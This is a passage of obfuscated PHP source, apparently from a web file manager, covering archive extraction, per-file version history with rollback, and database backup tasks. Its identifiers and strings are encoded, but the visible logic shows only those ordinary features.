°‰); file_put_contents(TEMP_FILES . $ã…“’õß[1197], $ã…“’õß[12]); if (IO::exist($„–ÂÃ¨¥)) { return array($ã…“’õß[200] => $„–ÂÃ¨¥, $ã…“’õß[1202] => $ò³Š§›, $ã…“’õß[1204] => $ÒÎ¯ °‰); } $öä×Ìã = self::localFilePath($ÙÒÕñéî); if (!$öä×Ìã) { $öä×Ìã = $ÒÎ¯ °‰ . $ã…“’õß[1223]; if (!IO::exist($öä×Ìã)) { self::copy($ÙÒÕñéî, $ÒÎ¯ °‰, !1, get_path_this($öä×Ìã)); } } if (!$öä×Ìã || !IO::exist($öä×Ìã)) { return !1; } if ($Ñ˜…¨„Ú[$ã…“’õß[1203]] == -1) { return array($ã…“’õß[200] => $öä×Ìã, $ã…“’õß[1202] => $ò³Š§›, $ã…“’õß[1204] => $ÒÎ¯ °‰); } $Ç÷Òî º = $öä×Ìã; foreach ($ò³Š§› as $¿ùóâü => $ŞäüŠÄ) { if (!$ŞäüŠÄ || $ŞäüŠÄ[$ã…“’õß[1203]] == $ã…“’õß[1201]) { break; } if (substr($ŞäüŠÄ[$ã…“’õß[32]], -1, 1) == $ã…“’õß[8]) { break; } $ÇÆì¬ß› = in_array(get_path_ext($ŞäüŠÄ[$ã…“’õß[1218]]), array($ã…“’õß[313], $ã…“’õß[1208], $ã…“’õß[1209], $ã…“’õß[1210], $ã…“’õß[1211], $ã…“’õß[1212])); $åØû‚” = $¿ùóâü == count($ò³Š§›) - 1 && $ÇÆì¬ß›; $±àÂ»¼ = $ÒÎ¯ °‰ . $ŞäüŠÄ[$ã…“’õß[1218]]; $  ª­ƒÎ = $ÒÎ¯ °‰ . get_path_this($ŞäüŠÄ[$ã…“’õß[32]]); if (IO::exist($±àÂ»¼)) { $Ç÷Òî º = $±àÂ»¼; continue; } $èş…£Ïñ = $¿ùóâü == 0 ? get_path_ext($¡“è¦§„) : get_path_ext($Ç÷Òî º); $¨Í·÷´š = KodArchive::extract(self::iconvSystem($Ç÷Òî º), $ÒÎ¯ °‰, $ŞäüŠÄ[$ã…“’õß[1203]], $ÕïŸ«¬, $èş…£Ïñ); self::unzipErrorCheck($¨Í·÷´š, array($ã…“’õß[1224], $ÙÒÕñéî, $ò³Š§›, $ŞäüŠÄ, $±àÂ»¼)); if (IO::exist($  ª­ƒÎ)) { IO::rename($  ª­ƒÎ, get_path_this($±àÂ»¼)); } $Ç÷Òî º = $±àÂ»¼; } $„–ÂÃ¨¥ = $Ç÷Òî º; return array($ã…“’õß[200] => $Ç÷Òî º, $ã…“’õß[1202] => $ò³Š§›, $ã…“’õß[1204] => $ÒÎ¯ °‰); } private static function unzipErrorCheck($©æÑÒ–­, $î¨¦¡ûß = false) { $¿¦Šæá— =& $_SERVER[şÒÁøÒÄ]; if ($©æÑÒ–­[$¿¦Šæá—[1225]]) { return !0; } write_log(array($¿¦Šæá—[1226], $©æÑÒ–­, $î¨¦¡ûß), $¿¦Šæá—[1227]); show_json($¿¦Šæá—[1228] . json_encode($©æÑÒ–­[$¿¦Šæá—[1215]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ø…ÅÍ¶‹ =& $_SERVER[şÒÁøÒÄ]; $ú³Æ½¸ú = $GLOBALS[$ø…ÅÍ¶‹[6]][$ø…ÅÍ¶‹[89]]; if ($ú³Æ½¸ú[$ø…ÅÍ¶‹[1229]] != 1) { return; } if ($ú³Æ½¸ú[$ø…ÅÍ¶‹[1230]] <= 0) { return; } if (isset($_REQUEST[$ø…ÅÍ¶‹[1231]]) && $_REQUEST[$ø…ÅÍ¶‹[1231]] == $ø…ÅÍ¶‹[88]) { return; } Hook::bind($ø…ÅÍ¶‹[1232], $ø…ÅÍ¶‹[1233]); Hook::bind($ø…ÅÍ¶‹[1234], $ø…ÅÍ¶‹[1235]); Hook::bind($ø…ÅÍ¶‹[1236], $ø…ÅÍ¶‹[1237]); Hook::bind($ø…ÅÍ¶‹[1238], $ø…ÅÍ¶‹[1239]); Hook::bind($ø…ÅÍ¶‹[1240], $ø…ÅÍ¶‹[1241]); Hook::bind($ø…ÅÍ¶‹[1242], $ø…ÅÍ¶‹[1243]); } public static function eventBeforeUpload($ı¿¯¡÷ş) { if ($ı¿¯¡÷ş[3] && $ı¿¯¡÷ş[3] != REPEAT_REPLACE) { return; } $¿®§¾ = self::parsePath($ı¿¯¡÷ş[0]); if (!$¿®§¾) { return; } self::add($¿®§¾); } public static function eventBeforeEdit($†›ˆ°´Ÿ) { $³†€Ê“ = self::parsePath($†›ˆ°´Ÿ[0]); if (!$³†€Ê“) { return; } self::add($³†€Ê“); } public static function eventBeforeCopyFile($êàˆàë©, $á‡ı¬ÓÀ, $ÃğÉß¤, $°ì¬ş”, $†—ƒÏóé, $ÕıÎºŸ½) { $õúùóı‹ =& $_SERVER[şÒÁøÒÄ]; if (isset($ÃğÉß¤->_data[$õúùóı‹[1168]]) && $ÃğÉß¤->_data[$õúùóı‹[1168]]) { return; } $ÑÆâ„š“ = $ÃğÉß¤->getPathOuter($°ì¬ş”); $­µöÛ® = self::parsePath($ÑÆâ„š“); if (!$­µöÛ®) { return; } self::add($­µöÛ®); } public static function eventBeforeRename($Ó²“‘»¯) { $ùÀô€é  =& $_SERVER[şÒÁøÒÄ]; $€Ò½¿« = self::parsePath($Ó²“‘»¯[0]); if (!$€Ò½¿«) { return; } $ÓÁú± = self::checkInHistory($€Ò½¿«); if (!$ÓÁú±) { return; } if ($ÓÁú±[$ùÀô€é [33]] == $ùÀô€é [200]) { $í¨ìÍ¾ë = self::listData($€Ò½¿«); if ($í¨ìÍ¾ë && $í¨ìÍ¾ë[$ùÀô€é [369]]) { self::moveHistory($€Ò½¿«, $Ó²“‘»¯[1]); } } else { IO::rename($ÓÁú±[$ùÀô€é [84]], $Ó²“‘»¯[1]); } } public static function eventBeforeMove($®÷Æİã‰) { $ÚòÔà§¾ =& $_SERVER[şÒÁøÒÄ]; $¨ÉÄñÎ = self::parsePath($®÷Æİã‰[0]); if (!$¨ÉÄñÎ) { return; } $‡ÌÃä€¸ = self::parsePath($®÷Æİã‰[1]); if (!$‡ÌÃä€¸) { return; } $ÑĞÄ¯»› = $®÷Æİã‰[3]; $‘ù°€İ® = self::checkInHistory($¨ÉÄñÎ); if (!$‘ù°€İ®) { return; } $šÇ”Ú›– = self::pathHistory($‡ÌÃä€¸); if ($‘ù°€İ®[$ÚòÔà§¾[33]] == $ÚòÔà§¾[200]) { $Å…ÇâòÔ = self::listData($¨ÉÄñÎ); $üª€½âì = rtrim($‡ÌÃä€¸, $ÚòÔà§¾[8]) . $ÚòÔà§¾[8] . ($ÑĞÄ¯»› ? $ÑĞÄ¯»› : get_path_this($¨ÉÄñÎ)); $ì›ÖÙ“ = self::listData($üª€½âì); if ($Å…ÇâòÔ && $Å…ÇâòÔ[$ÚòÔà§¾[369]] && $ì›ÖÙ“ && $ì›ÖÙ“[$ÚòÔà§¾[369]]) { return self::clear($¨ÉÄñÎ); } if ($Å…ÇâòÔ && $Å…ÇâòÔ[$ÚòÔà§¾[369]]) { self::moveHistory($¨ÉÄñÎ, $ÑĞÄ¯»›, $šÇ”Ú›–); } } else { IO::move($‘ù°€İ®[$ÚòÔà§¾[84]], $šÇ”Ú›–, !1, $ÑĞÄ¯»›); self::clearEmptyFolder(IO::pathFather($‘ù°€İ®[$ÚòÔà§¾[84]])); } } public static function eventAfterRemove($–ŠùÎŞÙ, $Õ¡‘µ˜ş) { $ç‘ÅÃÕ =& $_SERVER[şÒÁøÒÄ]; if (!$Õ¡‘µ˜ş) { return; } $Œëé•İ = self::parsePath($–ŠùÎŞÙ[0]); if (!$Œëé•İ) { return; } $äú‹’¢ = self::checkInHistory($Œëé•İ); if (!$äú‹’¢) { return; } if ($äú‹’¢[$ç‘ÅÃÕ[33]] == $ç‘ÅÃÕ[200]) { $š€Ä¡¼Ü = self::listData($Œëé•İ, !1); if ($š€Ä¡¼Ü && $š€Ä¡¼Ü[$ç‘ÅÃÕ[369]]) { self::clear($Œëé•İ, !1); } } else { IO::remove($äú‹’¢[$ç‘ÅÃÕ[84]]); self::clearEmptyFolder(IO::pathFather($äú‹’¢[$ç‘ÅÃÕ[84]])); } } private static function checkInHistory($äÑµªéŞ) { $ğì°®Š = self::pathHistory($äÑµªéŞ); if (!IO::exist($ğì°®Š)) { $ğì°®Š .= $_SERVER[şÒÁøÒÄ][1244]; } return IO::exist($ğì°®Š) ? IO::info($ğì°®Š) : !1; } private static function parsePath($àœ³ã›ë) { $ŒÎÙ€¡Ñ =& $_SERVER[şÒÁøÒÄ]; if (!$àœ³ã›ë) { return !1; } if ($GLOBALS[$ŒÎÙ€¡Ñ[1245]]) { return; } $ıüÙçè‡ = KodIO::parse($àœ³ã›ë); $Êíü‘â = $ıüÙçè‡[$ŒÎÙ€¡Ñ[33]]; $ÊŠÄ±ë = !$Êíü‘â || $Êíü‘â == KodIO::KOD_IO || $Êíü‘â == KodIO::KOD_SHARE_ITEM; if (!$ÊŠÄ±ë || !$ıüÙçè‡[$ŒÎÙ€¡Ñ[1246]]) { return !1; } if (substr($àœ³ã›ë, 0, strlen(DATA_PATH . $ŒÎÙ€¡Ñ[1247])) == DATA_PATH . $ŒÎÙ€¡Ñ[1247]) { return !1; } if ($Êíü‘â == KodIO::KOD_SHARE_ITEM) { $Œ²ŠÅ € = IO::init($àœ³ã›ë); if ($Œ²ŠÅ €->pathParse[$ŒÎÙ€¡Ñ[1164]]) { return self::parsePath($Œ²ŠÅ €->pathParse[$ŒÎÙ€¡Ñ[1164]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $£ƒıİ° = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ŒÎÙ€¡Ñ[1248]); foreach ($£ƒıİ° as $²¶ğÍ°¤) { if (!$Êíü‘â && substr($àœ³ã›ë, 0, strlen($²¶ğÍ°¤)) == $²¶ğÍ°¤) { return !1; } } self::log($GLOBALS[$ŒÎÙ€¡Ñ[1159]] . $ŒÎÙ€¡Ñ[1249] . $àœ³ã›ë); return $àœ³ã›ë; } private static function pathHistory($« õõ˜») { $¢ğæíˆ¼ =& $_SERVER[şÒÁøÒÄ]; $†¶¢ïĞ = self::$_historyBase . ltrim(KodIO::clear($« õõ˜»), $¢ğæíˆ¼[8]); $†¶¢ïĞ = str_replace(array($¢ğæíˆ¼[1250]), array($¢ğæíˆ¼[1251]), $†¶¢ïĞ); return $†¶¢ïĞ; } public static function log($†äšó‚İ) { } public static function historyCount($£–ÒßÌç) { $øëî¨½¥ =& $_SERVER[şÒÁøÒÄ]; $ÂÀ¤îğã = array(); $áœ£ê¡Ô = array(); foreach ($£–ÒßÌç as $ş€ûº²Å) { $ìÙşØñê = get_path_father($ş€ûº²Å); if (!$áœ£ê¡Ô[$ìÙşØñê]) { $áœ£ê¡Ô[$ìÙşØñê] = array(); } $áœ£ê¡Ô[$ìÙşØñê][] = get_path_this($ş€ûº²Å); } foreach ($áœ£ê¡Ô as $ìÙşØñê => $šŞ´šÏÂ) { $ÁÃ®ËœÓ = self::parsePath($ìÙşØñê); if (!$ÁÃ®ËœÓ) { continue; } foreach ($šŞ´šÏÂ as $€Ò½û‰ò) { $‚ˆè­Ü = self::listData(rtrim($ÁÃ®ËœÓ, $øëî¨½¥[8]) . $øëî¨½¥[8] . $€Ò½û‰ò, !1); if ($‚ˆè­Ü && $‚ˆè­Ü[$øëî¨½¥[369]]) { $ÂÀ¤îğã[rtrim($ìÙşØñê, $øëî¨½¥[8]) . $øëî¨½¥[8] . $€Ò½û‰ò] = count($‚ˆè­Ü[$øëî¨½¥[369]]); } } } return $ÂÀ¤îğã; } public static function add($í’öğ¨) { $ÉË¾–ƒî =& $_SERVER[şÒÁøÒÄ]; $øñÏ¾É¸ = self::listData($í’öğ¨); if (!$øñÏ¾É¸) { return; } $ÂÏÜÂÜş = Model($ÉË¾–ƒî[778])->get($ÉË¾–ƒî[1252]); $ğ×ğ„”Ê = $GLOBALS[$ÉË¾–ƒî[6]][$ÉË¾–ƒî[89]][$ÉË¾–ƒî[1230]]; $±ÌáŞ°î = $ÂÏÜÂÜş == $ÉË¾–ƒî[1253] ? min(5, $ğ×ğ„”Ê) : $ğ×ğ„”Ê; if ($ğ×ğ„”Ê <= 0) { return; } $¼®³Ğ = IO::info($í’öğ¨); $¡şŠëµÏ = $øñÏ¾É¸[$ÉË¾–ƒî[369]]; if ($¼®³Ğ[$ÉË¾–ƒî[76]] == 0) { return; } if ($¼®³Ğ[$ÉË¾–ƒî[76]] >= 1024 * 1024 * 500) { return !1; } $™³ˆ­Ò© = IO::hashSimple($í’öğ¨); if ($¡şŠëµÏ && $¡şŠëµÏ[0][$ÉË¾–ƒî[177]] == $™³ˆ­Ò©) { return !0; } if (array_key_exists($ÉË¾–ƒî[203], $¼®³Ğ) && !$¼®³Ğ[$ÉË¾–ƒî[203]]) { return !1; } $Œ³ïÈóè = short_id(time()); $¨“†ÏÙ¼ = array($ÉË¾–ƒî[399] => $Œ³ïÈóè, $ÉË¾–ƒî[177] => $™³ˆ­Ò©, $ÉË¾–ƒî[32] => $¼®³Ğ[$ÉË¾–ƒî[32]] . $ÉË¾–ƒî[10] . date($ÉË¾–ƒî[1254]) . rand_string(1), $ÉË¾–ƒî[76] => $¼®³Ğ[$ÉË¾–ƒî[76]], $ÉË¾–ƒî[454] => USER_ID, $ÉË¾–ƒî[201] => time(), $ÉË¾–ƒî[1255] => $ÉË¾–ƒî[12]); IO::mkdir($øñÏ¾É¸[$ÉË¾–ƒî[1256]]); $²åıŞÅ± = IO::copy($í’öğ¨, $øñÏ¾É¸[$ÉË¾–ƒî[1256]], !1, $¨“†ÏÙ¼[$ÉË¾–ƒî[32]]); if (!$²åıŞÅ±) { self::clearEmptyFolder($øñÏ¾É¸[$ÉË¾–ƒî[1256]]); return !1; } array_unshift($¡şŠëµÏ, $¨“†ÏÙ¼); if (count($¡şŠëµÏ) > $±ÌáŞ°î) { $·®»Üøé = array_slice($¡şŠëµÏ, $±ÌáŞ°î); foreach ($·®»Üøé as $óóÜ¨¾á) { IO::remove($øñÏ¾É¸[$ÉË¾–ƒî[1256]] . $óóÜ¨¾á[$ÉË¾–ƒî[32]]); } $¡şŠëµÏ = array_slice($¡şŠëµÏ, 0, $±ÌáŞ°î); } return self::saveData($øñÏ¾É¸[$ÉË¾–ƒî[1257]], $¡şŠëµÏ); } public static function remove($é²«¶·, $®‘ÉÔª) { $ÀÔ©§º =& $_SERVER[şÒÁøÒÄ]; $‡Íİßåï = self::listData($é²«¶·); $™÷ÊüÚ€ = array(); if (!$‡Íİßåï) { return !1; } foreach ($‡Íİßåï[$ÀÔ©§º[369]] as $î®¡ßåé) { if ($î®¡ßåé[$ÀÔ©§º[399]] == $®‘ÉÔª) { IO::remove($‡Íİßåï[$ÀÔ©§º[1256]] . $î®¡ßåé[$ÀÔ©§º[32]]); continue; } $™÷ÊüÚ€[] = $î®¡ßåé; } return self::saveData($‡Íİßåï[$ÀÔ©§º[1257]], $™÷ÊüÚ€); } public static function clear($ì››ã¿Ù, $¥ıÒ±âÕ = true) { $¹¬Ü¹ =& $_SERVER[şÒÁøÒÄ]; $ğøâîÍ… = self::listData($ì››ã¿Ù, $¥ıÒ±âÕ); if (!$ğøâîÍ…) { return !1; } foreach ($ğøâîÍ…[$¹¬Ü¹[369]] as $®Ö¯·Š´) { IO::remove($ğøâîÍ…[$¹¬Ü¹[1256]] . $®Ö¯·Š´[$¹¬Ü¹[32]]); } return self::saveData($ğøâîÍ…[$¹¬Ü¹[1257]], array()); } public static function moveHistory($æ¡®ªÂ’, $Û¤Ÿà› = '', $¨€³û¾ = '') { $¶éİÉ´ =& $_SERVER[şÒÁøÒÄ]; $¯äÁ§Ë– = self::listData($æ¡®ªÂ’, !1); if (!$¯äÁ§Ë– || !$¯äÁ§Ë–[$¶éİÉ´[369]]) { return !1; } $¯ë»Ÿ¹º = $¶éİÉ´[1244]; $Û¤Ÿà› = $Û¤Ÿà› ? $Û¤Ÿà› : get_path_this($æ¡®ªÂ’); $¨€³û¾ = $¨€³û¾ ? $¨€³û¾ : $¯äÁ§Ë–[$¶éİÉ´[1256]]; $çéÏÑü = substr(get_path_this($¯äÁ§Ë–[$¶éİÉ´[1257]]), 0, -strlen($¯ë»Ÿ¹º)); foreach ($¯äÁ§Ë–[$¶éİÉ´[369]] as $ôÔ—å§î => $©‘¸‡í™) { $¨á¯Ê = $Û¤Ÿà› . substr($©‘¸‡í™[$¶éİÉ´[32]], strlen($çéÏÑü)); $ßù†Òè³ = IO::move($¯äÁ§Ë–[$¶éİÉ´[1256]] . $©‘¸‡í™[$¶éİÉ´[32]], $¨€³û¾, !1, $¨á¯Ê); if ($ßù†Òè³) { $¯äÁ§Ë–[$¶éİÉ´[369]][$ôÔ—å§î][$¶éİÉ´[32]] = $¨á¯Ê; } } $¯äÁ§Ë–[$¶éİÉ´[1257]] = IO::move($¯äÁ§Ë–[$¶éİÉ´[1257]], $¨€³û¾, !1, $Û¤Ÿà› . $¯ë»Ÿ¹º); self::saveData($¯äÁ§Ë–[$¶éİÉ´[1257]], $¯äÁ§Ë–[$¶éİÉ´[369]]); self::clearEmptyFolder($¯äÁ§Ë–[$¶éİÉ´[1256]]); } public static function rollback($œÃ—²Ô, $”©š¤) { $œ¬İ†©İ =& $_SERVER[şÒÁøÒÄ]; $§¡¢©çû = self::listData($œÃ—²Ô); if (!$§¡¢©çû) { return; } $òãÃ“ùû = IO::info($œÃ—²Ô); foreach ($§¡¢©çû[$œ¬İ†©İ[369]] as $íğ¿® => $‚íó¤øô) { if ($‚íó¤øô[$œ¬İ†©İ[399]] == $”©š¤) { self::add($œÃ—²Ô); $²Şö‰½„ = $§¡¢©çû[$œ¬İ†©İ[1256]] . $‚íó¤øô[$œ¬İ†©İ[32]]; $€÷÷—º = IO::copy($²Şö‰½„, IO::pathFather($œÃ—²Ô), REPEAT_REPLACE, $òãÃ“ùû[$œ¬İ†©İ[32]]); if ($€÷÷—º) { self::remove($œÃ—²Ô, $”©š¤); } return $€÷÷—º; } } return !1; } public static function setDetail($–Á”Ç‚–, $ö‘¦ÔàÚ, $ù˜€¼öÈ) { $Ù´àÚù€ =& $_SERVER[şÒÁøÒÄ]; $Î±ö…µˆ = self::listData($–Á”Ç‚–); if (!$Î±ö…µˆ) { return; } foreach ($Î±ö…µˆ[$Ù´àÚù€[369]] as $Ù™ˆËø => $Ò‰Ü¢à) { if ($Ò‰Ü¢à[$Ù´àÚù€[399]] == $ö‘¦ÔàÚ) { $Î±ö…µˆ[$Ù´àÚù€[369]][$Ù™ˆËø][$Ù´àÚù€[1255]] = $ù˜€¼öÈ; self::saveData($Î±ö…µˆ[$Ù´àÚù€[1257]], $Î±ö…µˆ[$Ù´àÚù€[369]]); return !0; } } return !1; } public static function fileInfo($¾±Ìµß, $’İêœœ¤) { $Çí¿±»ó =& $_SERVER[şÒÁøÒÄ]; $ƒÁàÌş = self::listData($¾±Ìµß); if (!$ƒÁàÌş) { show_json(LNG($Çí¿±»ó[105]), !1); } $üÛ‚ìä¯ = $Çí¿±»ó[12]; foreach ($ƒÁàÌş[$Çí¿±»ó[369]] as $É„±ÄÏï => $Á‹…Í¸) { if ($Á‹…Í¸[$Çí¿±»ó[399]] != $’İêœœ¤) { continue; } $üÛ‚ìä¯ = $ƒÁàÌş[$Çí¿±»ó[1256]] . $Á‹…Í¸[$Çí¿±»ó[32]]; break; } if (!$üÛ‚ìä¯) { show_json(LNG($Çí¿±»ó[105]), !1); } return IO::info($üÛ‚ìä¯); } public static function fileOut($‡é¬¨ä, $óİ”³ñŒ, $‰©²š†² = false) { $¸÷Ğñ¯© =& $_SERVER[şÒÁøÒÄ]; $£ŞØ› ü = self::fileInfo($‡é¬¨ä, $óİ”³ñŒ); $ÏÇÕã£û =& $GLOBALS[$¸÷Ğñ¯©[7]]; $‰©²š†² = isset($ÏÇÕã£û[$¸÷Ğñ¯©[1207]]) && $ÏÇÕã£û[$¸÷Ğñ¯©[1207]] == 1; if (isset($ÏÇÕã£û[$¸÷Ğñ¯©[33]]) && $ÏÇÕã£û[$¸÷Ğñ¯©[33]] == $¸÷Ğñ¯©[1258]) { return IO::fileOutImage($£ŞØ› ü[$¸÷Ğñ¯©[84]], $ÏÇÕã£û[$¸÷Ğñ¯©[1259]]); } IO::fileOut($£ŞØ› ü[$¸÷Ğñ¯©[84]], $‰©²š†², get_path_this($‡é¬¨ä)); } public static function listData($Ö¯ÚªÉ, $”İ—ÏÉ· = true) { $³³şœ”¤ =& $_SERVER[şÒÁøÒÄ]; if ($”İ—ÏÉ· && !IO::exist($Ö¯ÚªÉ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ö¯ÚªÉ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $†Ø²Îîâ = self::pathHistory($Ö¯ÚªÉ); $¯”êî’ç = array($³³şœ”¤[1257] => $†Ø²Îîâ . $³³şœ”¤[1244], $³³şœ”¤[1256] => rtrim(get_path_father($†Ø²Îîâ), $³³şœ”¤[8]) . $³³şœ”¤[8], $³³şœ”¤[369] => array()); $­¤®’¶« = IO::getContent($¯”êî’ç[$³³şœ”¤[1257]]); if ($­¤®’¶«) { $êÉ§ıÂ– = json_decode($­¤®’¶«, !0); if (is_array($êÉ§ıÂ–)) { $¯”êî’ç[$³³şœ”¤[369]] = $êÉ§ıÂ–; } } return $¯”êî’ç; } private static function saveData($¾¹è‡ÒÔ, $Ëß˜‚¤ô) { $çÎõâä• =& $_SERVER[şÒÁøÒÄ]; self::log($çÎõâä•[1260] . $¾¹è‡ÒÔ . $çÎõâä•[71] . count($Ëß˜‚¤ô), $çÎõâä•[759]); if ($Ëß˜‚¤ô) { return IO::setContent($¾¹è‡ÒÔ, json_encode($Ëß˜‚¤ô)); } $¦³Âƒ÷… = IO::pathFather($¾¹è‡ÒÔ); IO::remove($¾¹è‡ÒÔ); self::clearEmptyFolder($¦³Âƒ÷…); return !0; } public static function clearEmptyFolder($ç€ˆğÏ¨) { $Üüªššö =& $_SERVER[şÒÁøÒÄ]; if (trim($ç€ˆğÏ¨, $Üüªššö[8]) == trim(self::$_historyBase, $Üüªššö[8])) { return; } $¬…£ŠÑ† = IO::pathFather($ç€ˆğÏ¨); $âÅ«ßîÍ = IO::has($ç€ˆğÏ¨, !0); if ($âÅ«ßîÍ[$Üüªššö[207]] > 0 || $âÅ«ßîÍ[$Üüªššö[208]] > 0) { return; } IO::remove($ç€ˆğÏ¨); self::clearEmptyFolder($¬…£ŠÑ†); } private static function getBasePath() { $ıŸ…ú¤ï =& $_SERVER[şÒÁøÒÄ]; $ãĞ¾Š¶Æ = Model($ıŸ…ú¤ï[1261])->get($ıŸ…ú¤ï[1262]); if ($ãĞ¾Š¶Æ) { if (!IO::exist($ãĞ¾Š¶Æ)) { IO::mkdir($ãĞ¾Š¶Æ); } if (get_path_this($ãĞ¾Š¶Æ) == $ıŸ…ú¤ï[1247]) { $ŞÕ”Ìê÷ = $ıŸ…ú¤ï[1263] . rand_string(8); @rename($ãĞ¾Š¶Æ, get_path_father($ãĞ¾Š¶Æ) . $ıŸ…ú¤ï[8] . $ŞÕ”Ìê÷); $ãĞ¾Š¶Æ = DATA_PATH . $ŞÕ”Ìê÷ . $ıŸ…ú¤ï[8]; file_put_contents(DATA_PATH . $ıŸ…ú¤ï[1197], $ıŸ…ú¤ï[12]); Model($ıŸ…ú¤ï[1261])->set($ıŸ…ú¤ï[1262], $ãĞ¾Š¶Æ); } return $ãĞ¾Š¶Æ; } $ãĞ¾Š¶Æ = DATA_PATH . $ıŸ…ú¤ï[1263] . rand_string(8) . $ıŸ…ú¤ï[8]; $ãĞ¾Š¶Æ = IO::mkdir($ãĞ¾Š¶Æ); $ãĞ¾Š¶Æ = rtrim($ãĞ¾Š¶Æ, $ıŸ…ú¤ï[8]) . $ıŸ…ú¤ï[8]; file_put_contents($ãĞ¾Š¶Æ . $ıŸ…ú¤ï[1197], $ıŸ…ú¤ï[12]); file_put_contents(DATA_PATH . $ıŸ…ú¤ï[1197], $ıŸ…ú¤ï[12]); Model($ıŸ…ú¤ï[1261])->set($ıŸ…ú¤ï[1262], $ãĞ¾Š¶Æ); return $ãĞ¾Š¶Æ; } } goto fŸÀÄõ¸é; C°™“Î†Š³: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ü¡µœ¬À =& $_SERVER[şÒÁøÒÄ]; $¬öø³ïÈ = Backup::get(); self::$io = $¬öø³ïÈ[$Ü¡µœ¬À[759]]; self::$name = $¬öø³ïÈ[$Ü¡µœ¬À[32]]; $¥ƒ®è²• = new DbManage(); $¹‡§ÛÖÆ = $¥ƒ®è²•->dbType(); $é„¨Ä‡ì = array($Ü¡µœ¬À[784] => $¹‡§ÛÖÆ, $Ü¡µœ¬À[785] => time()); Backup::set($é„¨Ä‡ì); $“ÒÄ’…ï = $this->tmpFilesPath() . $Ü¡µœ¬À[786] . self::$name . $Ü¡µœ¬À[8]; del_dir($“ÒÄ’…ï); mk_dir($“ÒÄ’…ï); $úğ€¯‘Æ = $¿Ç¢õÅõ = 0; $³ÅİŞÉù = new Task($Ü¡µœ¬À[787], $Ü¡µœ¬À[788], 0, LNG($Ü¡µœ¬À[789]) . $Ü¡µœ¬À[790] . LNG($Ü¡µœ¬À[791])); try { $¹ñúÇ“î = $¥ƒ®è²•->db()->getTables(); } catch (Exception $û„È™) { $³ÅİŞÉù->end(); return !1; } $¹ñúÇ“î = array_diff($¹ñúÇ“î, array($Ü¡µœ¬À[792], $Ü¡µœ¬À[793])); foreach ($¹ñúÇ“î as $îñÛÂÉ) { $úğ€¯‘Æ += $¥ƒ®è²•->model($îñÛÂÉ)->count(); } $³ÅİŞÉù->task[$Ü¡µœ¬À[794]] = $úğ€¯‘Æ; $GLOBALS[$Ü¡µœ¬À[795]] = self::$name; foreach ($¹ñúÇ“î as $îñÛÂÉ) { $—È˜äìì = $“ÒÄ’…ï . $îñÛÂÉ . $Ü¡µœ¬À[796]; $ Ø­‰ß¨ = null; if ($îñÛÂÉ == $Ü¡µœ¬À[797] && (!isset($¬öø³ïÈ[$Ü¡µœ¬À[762]]) || $¬öø³ïÈ[$Ü¡µœ¬À[762]] == $Ü¡µœ¬À[198])) { $ Ø­‰ß¨ = self::$io; } $¿Ç¢õÅõ += $¥ƒ®è²•->sqlFromDb($îñÛÂÉ, $—È˜äìì, $³ÅİŞÉù, $ Ø­‰ß¨); } unset($GLOBALS[$Ü¡µœ¬À[795]]); $³ÅİŞÉù->end(); if ($¿Ç¢õÅõ > $úğ€¯‘Æ) { $úğ€¯‘Æ = $¿Ç¢õÅõ; } $é„¨Ä‡ì = array($Ü¡µœ¬À[784] => $¹‡§ÛÖÆ, $Ü¡µœ¬À[781] => 1, $Ü¡µœ¬À[798] => $úğ€¯‘Æ, $Ü¡µœ¬À[799] => $¿Ç¢õÅõ, $Ü¡µœ¬À[800] => time()); Backup::set($é„¨Ä‡ì); if ($úğ€¯‘Æ - $¿Ç¢õÅõ > 0) { $Üßş¸É² = $Ü¡µœ¬À[801]; if (stristr(I18n::getType(), $Ü¡µœ¬À[802])) { $Üßş¸É² = $Ü¡µœ¬À[803]; } write_log(array($Üßş¸É², $é„¨Ä‡ì), $Ü¡µœ¬À[788]); return !1; } return !0; } private function tmpFilesPath() { $µ»ÖáÍ« =& $_SERVER[şÒÁøÒÄ]; $‚Îœ»¡¾ = TEMP_FILES; if ($GLOBALS[$µ»ÖáÍ«[6]][$µ»ÖáÍ«[89]][$µ»ÖáÍ«[804]]) { $‚Îœ»¡¾ = $GLOBALS[$µ»ÖáÍ«[6]][$µ»ÖáÍ«[89]][$µ»ÖáÍ«[804]]; if (!mk_dir($‚Îœ»¡¾) || !is_writable($‚Îœ»¡¾) || !IO::mkfile($‚Îœ»¡¾ . $µ»ÖáÍ«[805])) { $‚Îœ»¡¾ = TEMP_FILES; } } return $‚Îœ»¡¾; } } class BackupDbFile { public function __construct() { } public function index() { $èı—Æ°° =& $_SERVER[şÒÁøÒÄ]; $ÄÜÕÌ = Backup::get(); $Å©¨œõ¼ = $ÄÜÕÌ[$èı—Æ°°[32]]; $Å „íôƒ = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\160\x5f{$Å©¨œõ¼}\x2f"; $Æ³¢ù‹Í = $this->backupPath($ÄÜÕÌ); if (!($Æ³¢ù‹Í = IO::mkdir($Æ³¢ù‹Í))) { return !1; } $¼¤¨Ş·¡ = IO::listPath($Å „íôƒ); $Æû˜„‹Ø = isset($¼¤¨Ş·¡[$èı—Æ°°[83]]) ? $¼¤¨Ş·¡[$èı—Æ°°[83]] : array(); $£áıæÊ‘ = array_sum(array_column($Æû˜„‹Ø, $èı—Æ°°[76])); if (!$£áıæÊ‘) { return !1; } $Œ¦‚Ö¬ = array($èı—Æ°°[806] => $£áıæÊ‘, $èı—Æ°°[807] => time()); Backup::set($Œ¦‚Ö¬); $ÈæŠ‚Ó« = new TaskFileTransfer($èı—Æ°°[808], $èı—Æ°°[788], count($Æû˜„‹Ø), LNG($èı—Æ°°[789]) . $èı—Æ°°[386] . LNG($èı—Æ°°[791]) . $èı—Æ°°[809]); $ÈæŠ‚Ó«->task[$èı—Æ°°[771]] = $£áıæÊ‘; foreach ($¼¤¨Ş·¡[$èı—Æ°°[83]] as $Æ×¹é¿) { $ş¶­¤œù = IO::move($Æ×¹é¿[$èı—Æ°°[84]], $Æ³¢ù‹Í); if (!$ş¶­¤œù) { $ÈæŠ‚Ó«->end(); $á¨ìÆ º = IO::getLastError($èı—Æ°°[810] . $Æ×¹é¿[$èı—Æ°°[84]] 